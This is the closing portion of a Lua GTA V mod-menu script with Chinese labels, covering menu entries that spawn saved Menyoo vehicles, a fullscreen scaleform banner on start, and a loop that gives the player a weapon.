menyoovloaded_root = menu.list(mod111, "当前加载的载具", {"lancespoonerloadedvehicles"}, "你创造的载具")
function setup_menyoo_vehicles_list(mainroot, player, allplayers, dotp)
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        root = mainroot
        local ours = false
        if player == players.user() then
            ours = true 
        end
        if filesystem.is_dir(path) then
            root = menu.list(root, path:gsub(vehicles_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                menu.action(root, path:gsub(vehicles_dir, ''), {}, "生成这个载具", function(on_click)
                    ls_log("Click type was " .. on_click)
                    menyoo_load_vehicle(path, player, dotp, ours)
                end)
            end
        else
            if string.match(path:gsub(vehicles_dir, ''), '.xml') then
                menu.action(root, path:gsub(vehicles_dir, ''), {}, "生成这个载具", function(on_click)
                    ls_log("Click type was " .. on_click)
                    menyoo_load_vehicle(path, player, dotp, ours)
                end)
            end
        end
    end
end
setup_menyoo_vehicles_list(menyoovmain_root, players.user(), false, true)
setup_menyoo_maps_list()
CC_HUD={
    ["HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED"]=--[[Hash (int)]] function()native_invoker.begin_call()native_invoker.end_call_2(0xA48931185F0536FE)return native_invoker.get_return_value_int()end,

}




if SCRIPT_MANUAL_START then   
	scaleform_thread = util.create_thread(function (thr)
	scaleForm = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_SHARD_WASTED_MP_MESSAGE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(Openscript)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
	AUDIO.PLAY_SOUND_FRONTEND(55, insinst,Hcsound, true)
	starttime = os.time()
	while true do
	if os.time() - starttime >= 5 then
	    AUDIO.PLAY_SOUND_FRONTEND(55,insinsts, Csound, true)
	    util.stop_thread()
    end
	if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleForm) then
	   GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 255, 255, 255, 255,0)
    end
	   util.yield(1)
        end
    end)
end
while true do
    if bigbigbig then
        if (CC_HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) ~= -1810795771) then
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
    end
end
    util.yield()

end
while true do
    util.yield()
end




          
                                              ---------------============By从前从前
--================================================================================================END                                         